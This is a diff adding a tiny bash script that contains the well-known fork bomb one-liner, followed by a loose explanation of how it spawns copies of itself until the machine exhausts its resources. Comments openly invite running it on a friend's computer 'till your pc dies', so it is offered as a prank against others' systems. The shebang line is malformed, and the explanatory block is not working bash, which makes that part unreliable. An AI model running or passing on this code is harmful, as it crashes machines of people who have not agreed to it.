@@ -1,0 +1,9 @@
+#!usr/bin/env bash
+#do not run this on your pc run in it your friend's pc :)
+:(){:|:&};:
+#how it works
+function() {
+function | function &
+}
+function
+#it multiplies itself and runs in the background till your pc dies :)
